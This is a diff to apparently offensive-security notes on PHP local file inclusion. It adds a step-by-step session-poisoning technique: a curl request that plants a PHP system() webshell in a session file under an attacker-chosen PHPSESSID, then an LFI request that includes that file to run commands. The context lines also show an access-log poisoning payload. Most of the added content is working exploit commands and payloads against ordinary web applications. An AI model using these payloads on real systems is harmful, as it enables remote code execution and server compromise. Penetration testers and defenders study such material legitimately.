@@ -282,7 +282,30 @@ curl -A '<?php system($_GET[c]); ?>' http://target/
 ?language=/var/log/nginx/access.log&cmd=id
 ```
 
-Variant via PHP sessions: session files (`/var/lib/php/sessions/sess_<PHPSESSID>`) store user-controlled values — poison the session via `PHP_SESSION_UPLOAD_PROGRESS` and include the session file.
+Variant via PHP sessions. Session file: `/var/lib/php/sessions/sess_<PHPSESSID>` — the id comes from **a cookie we set**, so the path is fully ours. Any user-controlled value the app writes into `$_SESSION` lands inside that file verbatim.
+
+```php
+# the only thing the app needs — ANY unfiltered user input going into $_SESSION:
+session_start();                                       # id = our PHPSESSID cookie
+$_SESSION['username'] = $_POST['username'];            # typical login handler
+```
+
+```text
+# /var/lib/php/sessions/sess_poison123 right after step 1 below:
+username|s:31:"<?php system($_GET["cmd"]); ?>";
+```
+
+```bash
+# 1) pick our own session id + put the payload into the field that reaches $_SESSION
+curl -s 'http://target/login.php' \
+     -b 'PHPSESSID=poison123' \
+     --data 'username=<?php system($_GET["cmd"]); ?>&password=x'
+
+# 2) include the session file through the LFI — include-family => EXECUTES
+# ?language=../../../../var/lib/php/sessions/sess_poison123&cmd=id
+```
+
+Only include-family executes it (read-family, e.g. `file_get_contents`, prints the file as text). If the app never writes attacker-controlled data into `$_SESSION`, this channel has no content source — dead end on that endpoint.
 
 ---
 
